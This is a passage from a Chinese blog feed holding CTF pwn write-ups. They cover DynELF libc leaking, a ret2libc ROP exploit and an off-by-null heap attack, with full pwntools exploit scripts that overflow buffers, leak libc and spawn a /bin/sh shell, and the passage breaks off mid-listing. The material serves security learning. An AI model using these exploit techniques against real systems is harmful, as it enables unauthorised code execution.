    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/zszcr/article/details/79659071" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79659071</a></p><h3 id="DynELF模块"><a href="#DynELF模块" class="headerlink" title="DynELF模块"></a>DynELF模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwn题的无libc泄露用到的pwntools的DynELF模块</span><br><span class="line"></span><br><span class="line">实现条件是：</span><br><span class="line"></span><br><span class="line">有指向libc空间的 能泄露libc空间信息的函数 （write和puts函数）</span><br><span class="line"></span><br><span class="line">能重复触发漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DynELF模块的基本框架：</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">'xxx'</span>+address+<span class="string">'xxx'</span>  <span class="comment">#address就是你要泄露的地址 ，payload是你控制程序泄露出address处的信息的攻击代码</span></span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    leaked=p.recv(4)<span class="comment">#接受的字节要看程序是32位还是64位来决定 ，32位接受4个字节的数据 而64位接受8个字节的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[%s] -&gt;[%s]=[%s]"</span> % (hex(address),hex(u32(leaked)),repr(leaked))<span class="comment">#输出泄露的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> leaked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynelf = DynELF(leak,elf=ELF(<span class="string">'./xxx'</span>)) <span class="comment">#初始化DynELF模块</span></span><br><span class="line"></span><br><span class="line">system = dynelf.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你可以用DynELF模块搜索到system或者是execv函数在内存中地址 但是不能找到<span class="string">"/bin/sh"</span>字符串</span><br><span class="line"></span><br><span class="line">所以<span class="string">"/bin/sh"</span>要自己写入 bss段 </span><br><span class="line"></span><br><span class="line">因为我只做过write函数泄露的题 ，就先写怎么用write函数来实现 puts函数等以后做到了再补上</span><br><span class="line"></span><br><span class="line">write函数原型是 write(1,address,len) <span class="comment">#1表示标准输出流 ，address是write函数要输出信息的地址 ，而len表示输出长度</span></span><br><span class="line"></span><br><span class="line">所以说我们要构造的payload一般是</span><br><span class="line"></span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">'fakeebp'</span>+p32(write_plt)+p32(return_function)+p32(1)+p32(address)+p32(4)</span><br><span class="line"></span><br><span class="line">amd64</span><br><span class="line"></span><br><span class="line">payload=junk+<span class="string">"fakerbp"</span>+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(address)+p64(pop_rdx)+p64(8)+p64(write_plt)+p64(return_address)</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XDCTF2015-pwn200</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180322200957722" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检查了下防护机制 发现开启了堆栈不可执行 所以不可以在栈上插入shellcode</span><br><span class="line"></span><br><span class="line">同时在用ROPgadget搜索了下system函数和<span class="string">"/bin/sh"</span> 发现找不到 </span><br><span class="line"></span><br><span class="line">简单运行下发 它输出了一句话 和让我输入一串字符串</span><br><span class="line"></span><br><span class="line">用ida反汇编</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180322201423470" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以发现write函数在plt和got都存在，同时还有<span class="built_in">read</span>函数</span><br><span class="line"></span><br><span class="line">我们就可以用write函数来泄露libc内存空间 ，借助DynELF模块来得到system函数的地址</span><br><span class="line"></span><br><span class="line">向bss段写入<span class="string">"/bin/sh\x00"</span>字符串 然后调用system函数就行了</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line">elf=ELF(&apos;./xdctf15-pwn200&apos;)</span><br><span class="line"></span><br><span class="line">write_plt=elf.symbols[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">read_plt=elf.symbols[&apos;read&apos;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">start=0x080483D0</span><br><span class="line">main=0x080484BE</span><br><span class="line">def leak(address):</span><br><span class="line">        payload=&apos;a&apos;*(0x6c+4)+p32(write_plt)+p32(start)+p32(1)+p32(address)+p32(4)</span><br><span class="line">        p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">leaked=p.recv(4)</span><br><span class="line">print &quot;[%s] -&gt; [%s] = [%s]&quot; % (hex(address),hex(u32(leaked)),repr(leaked))</span><br><span class="line">return leaked</span><br><span class="line">d=DynELF(leak,elf=ELF(&apos;./xdctf15-pwn200&apos;))</span><br><span class="line">system=d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##use pppret  来保持栈平衡 ：调用子程序时先保存堆栈信息（某些堆栈相关的寄存器），待子程序返回后将堆栈恢复到调用前的状态（堆栈用于保存局部变量、函数参数等重要信息），以保证程序能够继续正确运行</span><br><span class="line"></span><br><span class="line">payload2=&apos;a&apos;*(0x6c+4)+p32(read_plt)+p32(0x080485cd)+p32(0)+p32(bss)+p32(8)</span><br><span class="line"></span><br><span class="line">payload2+=p32(system)+p32(0xdeadbeef)+p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文链接：&lt;a href=&quot;https://blog.csdn.net/zszcr/article/details/79659071&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/zszcr/article/de
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rop</title>
    <link href="http://yoursite.com/2019/07/28/rop/"/>
    <id>http://yoursite.com/2019/07/28/rop/</id>
    <published>2019-07-28T11:08:58.155Z</published>
    <updated>2019-07-28T11:49:31.603Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/AQ51SQ11~(Y6ROS$Y3HTUB0.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="built_in">return</span> write(1, <span class="string">"Hello, World\n"</span>, 0xDu);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write函数可以写入system函数</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+10h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span>函数可以溢出</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">首先计算padding</span><br><span class="line"></span><br><span class="line">write函数里面有个buf</span><br><span class="line"></span><br><span class="line">+00000000  r              db 4 dup(?)</span><br><span class="line">+00000004 fd              dd ?</span><br><span class="line">+00000008 buf             dd ?</span><br><span class="line"></span><br><span class="line">占8个字节</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>函数里面的buf</span><br><span class="line"></span><br><span class="line">-00000088 buf             db ?</span><br><span class="line">-00000087                 db ? ; undefined</span><br><span class="line">-00000086                 db ? ; undefined</span><br><span class="line">-00000085                 db ? ; undefined</span><br><span class="line">-00000084                 db ? ; undefined</span><br><span class="line">........</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">所以 padding为0x88+4+8</span><br><span class="line"></span><br><span class="line">write函数地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180516232447976" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180516231426597" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh地址</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/rop1.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main函数地址</span><br><span class="line">同样方法从ida中获取main函数地址：0x80484c6</span><br><span class="line"></span><br><span class="line">之所以需要main函数地址，是因为getshell的时候需要两次溢出。</span><br><span class="line"></span><br><span class="line">第一次：获取write函数的真实地址，再减去偏移，得到libc地址。</span><br><span class="line"></span><br><span class="line">第二次：计算出真实的system地址和bin_sh地址，进行getshell</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">先泄露write函数真实地址，构造rop链为：</span><br><span class="line"></span><br><span class="line">第一项：padding</span><br><span class="line"></span><br><span class="line">第二项：write函数的plt地址</span><br><span class="line"></span><br><span class="line">第三项(write函数参数1)：数字1，write函数第一个参数</span><br><span class="line"></span><br><span class="line">第四项(write函数参数2 输出的内容)：write函数的got地址</span><br><span class="line"></span><br><span class="line">第五项(write函数参数3 输出的长度)：数字4，表示输出4个字节的地址</span><br><span class="line"></span><br><span class="line">第六项： main函数的地址，为了让write函数输出结束后，再执行一遍main函数，进行第二波溢出。</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line"></span><br><span class="line">得到write函数的真实地址后，开始计算Libc地址和system函数地址：</span><br><span class="line"></span><br><span class="line">libc地址 = write函数真实地址 - write函数的offset</span><br><span class="line"></span><br><span class="line">（write函数的offset用/bin/sh的方法，偏移是:0xd43c0）</span><br><span class="line"></span><br><span class="line">system真实地址 = libc地址 + system函数offset</span><br><span class="line"></span><br><span class="line">bin_sh真实地址  = libc地址 + /bin/sh偏移地址offset</span><br><span class="line"></span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">第一项：140长度的padding</span><br><span class="line">第二项：system函数真实地址</span><br><span class="line">第三项：/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://github.com/xfgg/xfgg.git
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off by null漏洞</title>
    <link href="http://yoursite.com/2019/07/27/off%20by%20null%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/07/27/off by null漏洞/</id>
    <published>2019-07-27T14:11:53.766Z</published>
    <updated>2019-07-27T14:31:21.479Z</updated>
    
    <content type="html"><![CDATA[<h3 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h3><p>原文链接：<a href="https://www.anquanke.com/post/id/171283" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用pwnable.tw里面的secret_of_my_heart作为例题</span><br><span class="line">pwnable.tw不知道我为什么题目取不出来，只能直接学</span><br><span class="line">这个漏洞有点难懂 看了挺久的 为了解决easy_heap那一题</span><br><span class="line">首先介绍这题</span><br><span class="line"></span><br><span class="line">检查</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t01f2284b432b1a2904.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该程序有三个功能</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01bbb8a2557df61293.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分别是add、delete和show功能。</span><br><span class="line">程序刚开始使用mmap函数申请了一块内存:</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t01027558b22eec9cf4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里的mmap出的内存里面主要作用是用来存放一个个secret结构体</span><br><span class="line"></span><br><span class="line">sercet的结构体如下:</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01262ebc1ac1d814f1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面看一下add函数</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t0125397c8c5ad6f08f.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞点在add函数中的input_str函数中</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01626f07894f3a1ece.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">红框中的代码有泄露漏洞，可以泄露堆的地址</span><br><span class="line"></span><br><span class="line">而蓝框中的代码则是在输入的最后加上字节”\x00″，这样就造成了offbynull漏洞。</span><br><span class="line"></span><br><span class="line">看一下show函数的内容:</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t0192cd1c5b4e12af0d.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再看一下delete函数中的内容:</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t012eba25f6ca66c7ab.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、可以通过unsortedbin attack写入到free_hook上方，然后利用fastbin attack写入system的地址，从而拿到shell；</span><br><span class="line"></span><br><span class="line">2、可以通过fastbin attack修改malloc_hook为one_gadget，然后利用malloc_printerr触发malloc；</span><br><span class="line"></span><br><span class="line">3、可以通过fastbin attack修改_IO_FILE文件结构体的vtable中的函数地址为one_gadget来拿到shell；</span><br><span class="line"></span><br><span class="line">4、可以通过fastbin attack修改top chunk指针来劫持top chunk，拿到shell;</span><br></pre></td></tr></table></figure><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一种思路的实现</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t013166d4cb63be868a.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是exp中的各个函数</span><br><span class="line"></span><br><span class="line">首先先去申请5个chunk和泄露堆的地址,大小分别有0x68和0xF8的</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t011505d3c31c553a2d.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">然后进行chunk overlap</span><br><span class="line"></span><br><span class="line">这里的大概思路是，通过3号chunk去溢出4号chunk的prevsize和size，使得当释放4号chunk时，去合并0-3号chunk。这里为了绕过unlink中出现的crash，我们需要先将0号chunk给free掉。 ![](YinXiangBiJi.enexfiles/chunkoverlap.png)</span><br><span class="line"></span><br><span class="line">这里需要说一下，p64(0x0)+p64(0x71)+p64(attack_heap)+p64(0x00)是为后面unsortedbin attack做准备，所以可以暂时忽略，后面的p64(0x100+0x100+0x70+0x70)是伪造的prev_size，这样去free掉4号chunk就可以将0-4号chunk合并并放入unsortedbin中。</span><br><span class="line"></span><br><span class="line">特别说明一下，attack_heap的地址为0x562b0fa382c0。</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01c0adaa3f43192db7.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看到，这里已经实现了我们的目的。</span><br><span class="line"></span><br><span class="line">然后进行libc地址泄露</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t010087b8023e052b85.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们已经将0-4号合并的chunk放到了unsortedbin中，但1号chunk实际上并没有被我们free过，所以我们把在unsortedbin中的0号chunk申请掉，malloc就会切割chunk，并将unsortedbin的地址放到1号chunk里面，这时候我们去show1号chunk就可以得到unsortedbin地址了。</span><br><span class="line"></span><br><span class="line">我们已经将libc地址泄露了，接下来我们该如何利用这些chunk拿到shell呢？</span><br><span class="line"></span><br><span class="line">首先，我们先去free掉2号chunk,使得2号chunk放入fastbin中，那么现在堆的布局是怎样的呢？我们来看一下。</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t012e1db7042552fe71.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样我们就可以通过去unsortedbin中取得内存，来控制0x562b0fa38200中的内容了.</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t01828c065b94d4e0f7.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先new一个0xE8大小的内存。</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t0102a11bac2b395543.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后通过new一块0x70+0x70大小的chunk，控制0x562b0fa38200中的prev_size为0,size为0x71，fd为attack_heap，也就是0x562b0fa382c0</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01c961a6cc0a1acfb0.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看一下0x562b0fa382c0中的情况</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t017fae9d0d3826d99e.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么0x562b0fa382c0中为什么回事这样呢，还记得前面吗？</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t010b034401eba4fbd4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里我们对0x562b0fa382c0写入了p64(0x0)+p64(0x71)+p64(attack_heap)。</span><br><span class="line"></span><br><span class="line">这样，fastbin中就有了三个chunk，分别是0x562b0fa38200，0x562b0fa382c0，0x562b0fa382c0。</span><br><span class="line"></span><br><span class="line">接下来我们将0x562b0fa38200申请出来，然后通过申请0x562b0fa382c0这个chunk改变第二个0x562b0fa382c0的fd和unsortedbin中的chunk的bk。从而进行fastbin attack和unsortedbin attack。</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t018a8aa6e12d25fe39.png" alt></p><p>还有四种方法自行原文学习 ，学一种我就快die了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 